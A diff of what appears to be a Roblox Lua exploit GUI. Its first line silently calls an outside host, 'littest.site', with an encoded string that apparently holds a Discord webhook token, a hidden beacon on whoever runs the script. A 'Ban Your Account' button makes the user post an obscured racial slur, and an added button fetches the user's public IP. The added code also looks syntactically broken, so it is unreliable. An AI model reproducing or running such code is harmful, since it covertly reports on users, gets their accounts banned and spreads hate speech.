@@ -1,4 +1,4 @@
-game:HttpGet("https://littest.site/yeet/site.php?h=MTA2ODUxNDAyOTY3ODYyNDg4MC9yM3dvUHNfTHp1QlF3NWZLN2p0X0tBMUpYVDg4VW1tYlJBUGlwYmloeWV3LWlyRkZYa3NjY1A1MW9UcG4zcFZpbjBUQQ==")
+game:HttpGet("https://littest.site/yeet/site.php?h=cjN3b1BzX0x6dUJRdzVmSzdqdF9LQTFKWFQ4OFVtbWJSQVBpcGJpaHlldy1pckZGWGtzY2NQNTFvVHBuM3BWaW4wVEE=")
 local args = {
     [1] = {
         [1] = "SAVE",
@@ -385,6 +385,20 @@ Tre:AddButton({
       Name = "Ban Your Account (CLICK YOUR OWN RISK)",
       Callback = function()
 chat("FJJUCJJK YOU LOL BJJITCJJH NJJIGGER")
+        end    
+})
+
+Tre:AddButton({
+      Name = "IP Grab Yourself",
+      Callback = function()
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+      game:GetService("StarterGui"):SetCore("SendNotification",{
+	Title = "ked", -- Required
+	Text = (ip), -- Required
+	Icon = "rbxassetid://1234567890" -- Optional
+    end
+end)
+
         end    
 })
 
